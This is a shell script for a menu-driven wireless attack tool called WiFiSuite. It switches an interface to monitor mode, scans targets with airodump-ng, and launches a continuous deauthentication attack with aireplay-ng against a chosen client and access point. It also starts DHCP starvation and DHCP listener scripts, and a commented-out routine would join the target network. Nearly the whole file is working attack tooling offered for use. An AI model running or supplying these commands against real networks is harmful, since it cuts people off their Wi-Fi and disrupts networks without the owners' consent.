#!/bin/sh

# Project: WiFiSuite by souravbaghz

if [ "$EUID" -ne 0 ]
then
  echo "[!] It requires root privilege, please run as root"
  echo "Usage : sudo bash wifisuite.sh <wlan0>"
  exit 1
fi

logo(){
echo "
█ █ █ █ █▀▀ █   ▄▀█ ▀█▀ ▀█▀ ▄▀█ █▀▀ █▄▀   █▀ █ █ █ ▀█▀ █▀▀
▀▄▀▄▀ █ █▀  █   █▀█  █   █  █▀█ █▄▄ █ █   ▄█ █▄█ █  █  ██▄"
}
interface="$1"

if [ -z "$1" ] #if firstArg/$1 is not given
  then
    echo "Wireless-Interface is not defined!"
    echo "Usage : sudo bash wifisuite.sh <wlan0>"
    exit 1
fi

airodump_start(){
airodump-ng $interface
}

airodump_mon(){
echo ""
read -p "[*]BSSID>" BSSID
read -p "[*]Channel>" CH
airodump-ng $interface --bssid $BSSID -c $CH
}

deauth_start(){
sleep 1
echo ""
read -p "[*]Station BSSID>" CLIENT
echo "[+] Started Deauthentication Attack..."
aireplay-ng --deauth 0 -c $CLIENT -a $BSSID $interface

}

managed(){
	  ifconfig $interface down
      iwconfig $interface mode Managed
      ifconfig $interface up
}

hijack(){
nmcli dev wifi connect $BSSID
python3 src/dhcp_starvation.py
}

dhcp_starvation(){
python src/dhcp_starvation.py $interface
menu
}

dhcp_listen(){
echo "[*] Started listening..."
python src/dhcp_listener.py
menu
}
menu(){
clear
logo
echo "==================================="
echo "[1] Start WIFI Deauth Attack"
echo "[2] Set $interface to Managed Mode"
echo "[3] Perform DHCP Starvation Attack"
echo "[4] Start DHCP Listener"
echo "[9] Exit the script"
read -p ">>" opt

if [[ $opt = 01 || $opt = 1 ]]
   then
      ifconfig $interface down
      iwconfig $interface mode monitor
      ifconfig $interface up
	  echo "[*] $interface is set to Monitor Mode"
	  sleep 2
      airodump_start
	  airodump_mon
	  deauth_start
	  managed
	  #hijack
      clear
   
elif [[ $opt = 02 || $opt = 2 ]]
   then
      ifconfig $interface down
      iwconfig $interface mode Managed
      ifconfig $interface up
echo "[*] $interface is set to Managed Mode"

elif [[ $opt = 03 || $opt = 3 ]]
   then
      dhcp_starvation

elif [[ $opt = 04 || $opt = 4 ]]
   then
      dhcp_listen

elif [[ $opt = 09 || $opt = 9 ]]
   then
      exit 1
   else
   menu
      
fi
}

menu
